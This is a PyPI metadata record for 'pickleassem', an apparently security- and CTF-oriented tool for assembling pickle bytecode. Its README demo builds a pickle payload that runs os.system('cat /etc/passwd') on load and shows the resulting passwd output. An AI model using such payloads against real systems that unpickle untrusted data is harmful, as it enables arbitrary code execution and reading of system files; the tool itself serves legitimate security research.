{"info": {"author": "Saiyang Gou", "author_email": "gousaiyang223@gmail.com", "bugtrack_url": null, "classifiers": ["Development Status :: 5 - Production/Stable", "Intended Audience :: Developers", "Intended Audience :: Information Technology", "License :: OSI Approved :: MIT License", "Operating System :: OS Independent", "Programming Language :: Python :: 3 :: Only", "Topic :: Security", "Topic :: Software Development :: Assemblers", "Topic :: Utilities"], "description": "# pickleassem\n\n[![PyPI - Downloads](https://pepy.tech/badge/pickleassem)](https://pepy.tech/count/pickleassem)\n[![PyPI - Version](https://img.shields.io/pypi/v/pickleassem.svg)](https://pypi.org/project/pickleassem)\n[![PyPI - Format](https://img.shields.io/pypi/format/pickleassem.svg)](https://pypi.org/project/pickleassem)\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pickleassem.svg)](https://pypi.org/project/pickleassem)\n[![PyPI - Status](https://img.shields.io/pypi/status/pickleassem.svg)](https://pypi.org/project/pickleassem)\n![License](https://img.shields.io/github/license/gousaiyang/pickleassem.svg)\n\nA simple pickle assembler to make handcrafting pickle bytecode easier.\n\n## Demo\n\n```python\nimport pickle\nimport pickletools\n\nfrom pickleassem import PickleAssembler\n\npa = PickleAssembler(proto=4)\npa.push_mark()\npa.push_short_binunicode('cat /etc/passwd')\npa.build_inst('os', 'system')\npayload = pa.assemble()\nassert b'R' not in payload\nprint(payload)\npickletools.dis(payload, annotate=1)\npickle.loads(payload)\n```\n\nOutput:\n\n```\nb'\\x80\\x04(\\x8c\\x0fcat /etc/passwdios\\nsystem\\n.'\n    0: \\x80 PROTO      4 Protocol version indicator.\n    2: (    MARK         Push markobject onto the stack.\n    3: \\x8c     SHORT_BINUNICODE 'cat /etc/passwd' Push a Python Unicode string object.\n   20: i        INST       'os system' (MARK at 2) Build a class instance.\n   31: .    STOP                                   Stop the unpickling machine.\nhighest protocol among opcodes = 4\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n...\n0\n```\n\n## Installation\n\nInstall with pip: `pip install -U pickleassem`\n\n## Documentation\n\nJust refer to the source code. Each method of `PickleAssembler` whose name begins with `push`, `build`, `pop` or `memo` corresponds to a pickle opcode.\n\nThe following opcodes and corresponding features are not implemented: `PERSID`, `BINPERSID`, `EXT1`, `EXT2`, `EXT4`, `FRAME`, `NEXT_BUFFER`, `READONLY_BUFFER`.\n\n## See Also\n\nOther tools for pickle exploit:\n\n- `anapickle`: [slides](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf), [repo](https://github.com/sensepost/anapickle)\n- [`pwnypack.pickle`](https://github.com/edibledinos/pwnypack/blob/master/pwnypack/pickle.py)\n\n\n", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/gousaiyang/pickleassem", "keywords": "pickle assembler handcraft bytecode security exploit ctf", "license": "MIT", "maintainer": "", "maintainer_email": "", "name": "pickleassem", "package_url": "https://pypi.org/project/pickleassem/", "platform": "", "project_url": "https://pypi.org/project/pickleassem/", "project_urls": {"Homepage": "https://github.com/gousaiyang/pickleassem"}, "release_url": "https://pypi.org/project/pickleassem/1.0.0/", "requires_dist": null, "requires_python": ">=3", "summary": "A simple pickle assembler to make handcrafting pickle bytecode easier.", "version": "1.0.0", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1>pickleassem</h1>\n<p><a href=\"https://pepy.tech/count/pickleassem\" rel=\"nofollow\"><img alt=\"PyPI - Downloads\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/810f8549e31a3a7862850c0504e4009e0402bbc8/68747470733a2f2f706570792e746563682f62616467652f7069636b6c65617373656d\"></a>\n<a href=\"https://pypi.org/project/pickleassem\" rel=\"nofollow\"><img alt=\"PyPI - Version\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/1c06700be4c5960932d17a28400d87c0f7a48d76/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f7069636b6c65617373656d2e737667\"></a>\n<a href=\"https://pypi.org/project/pickleassem\" rel=\"nofollow\"><img alt=\"PyPI - Format\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/a425bd107c674edf46f14ec4b1682340c21b9f65/68747470733a2f2f696d672e736869656c64732e696f2f707970692f666f726d61742f7069636b6c65617373656d2e737667\"></a>\n<a href=\"https://pypi.org/project/pickleassem\" rel=\"nofollow\"><img alt=\"PyPI - Python Version\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/121f59128fb309bc3300585b76912fa026fafaef/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f7069636b6c65617373656d2e737667\"></a>\n<a href=\"https://pypi.org/project/pickleassem\" rel=\"nofollow\"><img alt=\"PyPI - Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/7a6dafb07fe68297145f347bf7e0e76981de8f58/68747470733a2f2f696d672e736869656c64732e696f2f707970692f7374617475732f7069636b6c65617373656d2e737667\"></a>\n<img alt=\"License\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/12fd473bd7de03d722f69b898150d3117ec4e6af/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f676f7573616979616e672f7069636b6c65617373656d2e737667\"></p>\n<p>A simple pickle assembler to make handcrafting pickle bytecode easier.</p>\n<h2>Demo</h2>\n<pre><span class=\"kn\">import</span> <span class=\"nn\">pickle</span>\n<span class=\"kn\">import</span> <span class=\"nn\">pickletools</span>\n\n<span class=\"kn\">from</span> <span class=\"nn\">pickleassem</span> <span class=\"kn\">import</span> <span class=\"n\">PickleAssembler</span>\n\n<span class=\"n\">pa</span> <span class=\"o\">=</span> <span class=\"n\">PickleAssembler</span><span class=\"p\">(</span><span class=\"n\">proto</span><span class=\"o\">=</span><span class=\"mi\">4</span><span class=\"p\">)</span>\n<span class=\"n\">pa</span><span class=\"o\">.</span><span class=\"n\">push_mark</span><span class=\"p\">()</span>\n<span class=\"n\">pa</span><span class=\"o\">.</span><span class=\"n\">push_short_binunicode</span><span class=\"p\">(</span><span class=\"s1\">'cat /etc/passwd'</span><span class=\"p\">)</span>\n<span class=\"n\">pa</span><span class=\"o\">.</span><span class=\"n\">build_inst</span><span class=\"p\">(</span><span class=\"s1\">'os'</span><span class=\"p\">,</span> <span class=\"s1\">'system'</span><span class=\"p\">)</span>\n<span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">pa</span><span class=\"o\">.</span><span class=\"n\">assemble</span><span class=\"p\">()</span>\n<span class=\"k\">assert</span> <span class=\"sa\">b</span><span class=\"s1\">'R'</span> <span class=\"ow\">not</span> <span class=\"ow\">in</span> <span class=\"n\">payload</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span>\n<span class=\"n\">pickletools</span><span class=\"o\">.</span><span class=\"n\">dis</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">,</span> <span class=\"n\">annotate</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n<span class=\"n\">pickle</span><span class=\"o\">.</span><span class=\"n\">loads</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">)</span>\n</pre>\n<p>Output:</p>\n<pre><code>b'\\x80\\x04(\\x8c\\x0fcat /etc/passwdios\\nsystem\\n.'\n    0: \\x80 PROTO      4 Protocol version indicator.\n    2: (    MARK         Push markobject onto the stack.\n    3: \\x8c     SHORT_BINUNICODE 'cat /etc/passwd' Push a Python Unicode string object.\n   20: i        INST       'os system' (MARK at 2) Build a class instance.\n   31: .    STOP                                   Stop the unpickling machine.\nhighest protocol among opcodes = 4\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n...\n0\n</code></pre>\n<h2>Installation</h2>\n<p>Install with pip: <code>pip install -U pickleassem</code></p>\n<h2>Documentation</h2>\n<p>Just refer to the source code. Each method of <code>PickleAssembler</code> whose name begins with <code>push</code>, <code>build</code>, <code>pop</code> or <code>memo</code> corresponds to a pickle opcode.</p>\n<p>The following opcodes and corresponding features are not implemented: <code>PERSID</code>, <code>BINPERSID</code>, <code>EXT1</code>, <code>EXT2</code>, <code>EXT4</code>, <code>FRAME</code>, <code>NEXT_BUFFER</code>, <code>READONLY_BUFFER</code>.</p>\n<h2>See Also</h2>\n<p>Other tools for pickle exploit:</p>\n<ul>\n<li><code>anapickle</code>: <a href=\"https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf\" rel=\"nofollow\">slides</a>, <a href=\"https://github.com/sensepost/anapickle\" rel=\"nofollow\">repo</a></li>\n<li><a href=\"https://github.com/edibledinos/pwnypack/blob/master/pwnypack/pickle.py\" rel=\"nofollow\"><code>pwnypack.pickle</code></a></li>\n</ul>\n\n          </div>"}, "last_serial": 6336066, "releases": {"1.0.0": [{"comment_text": "", "digests": {"md5": "60789fe34c03cf7992b33f5b771f0256", "sha256": "1d833a0f419d6d7a1d9367396645c43be320e60d873b79cab23b22825e75f095"}, "downloads": -1, "filename": "pickleassem-1.0.0-py3-none-any.whl", "has_sig": false, "md5_digest": "60789fe34c03cf7992b33f5b771f0256", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3", "size": 8115, "upload_time": "2019-12-19T22:17:02", "upload_time_iso_8601": "2019-12-19T22:17:02.372209Z", "url": "https://files.pythonhosted.org/packages/b5/01/f816c5b5e5f92abb6589661c40d99e05a04488c64001f7feec986ca50825/pickleassem-1.0.0-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "b5d560b3fba3a4a6e7c9dac8fd4c511d", "sha256": "9112219829b2a8cf4bfb13ca6d880e44aedf5a6e879d4d3816635def691cc4b9"}, "downloads": -1, "filename": "pickleassem-1.0.0.tar.gz", "has_sig": false, "md5_digest": "b5d560b3fba3a4a6e7c9dac8fd4c511d", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3", "size": 8291, "upload_time": "2019-12-19T22:17:04", "upload_time_iso_8601": "2019-12-19T22:17:04.400322Z", "url": "https://files.pythonhosted.org/packages/f1/20/1d1fc5fae8f78d69dc0c0ee8bbf5e2757aa5b308d27cc3e7fa170b42815f/pickleassem-1.0.0.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "60789fe34c03cf7992b33f5b771f0256", "sha256": "1d833a0f419d6d7a1d9367396645c43be320e60d873b79cab23b22825e75f095"}, "downloads": -1, "filename": "pickleassem-1.0.0-py3-none-any.whl", "has_sig": false, "md5_digest": "60789fe34c03cf7992b33f5b771f0256", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3", "size": 8115, "upload_time": "2019-12-19T22:17:02", "upload_time_iso_8601": "2019-12-19T22:17:02.372209Z", "url": "https://files.pythonhosted.org/packages/b5/01/f816c5b5e5f92abb6589661c40d99e05a04488c64001f7feec986ca50825/pickleassem-1.0.0-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "b5d560b3fba3a4a6e7c9dac8fd4c511d", "sha256": "9112219829b2a8cf4bfb13ca6d880e44aedf5a6e879d4d3816635def691cc4b9"}, "downloads": -1, "filename": "pickleassem-1.0.0.tar.gz", "has_sig": false, "md5_digest": "b5d560b3fba3a4a6e7c9dac8fd4c511d", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3", "size": 8291, "upload_time": "2019-12-19T22:17:04", "upload_time_iso_8601": "2019-12-19T22:17:04.400322Z", "url": "https://files.pythonhosted.org/packages/f1/20/1d1fc5fae8f78d69dc0c0ee8bbf5e2757aa5b308d27cc3e7fa170b42815f/pickleassem-1.0.0.tar.gz", "yanked": false}], "timestamp": "Fri May  8 02:55:04 2020"}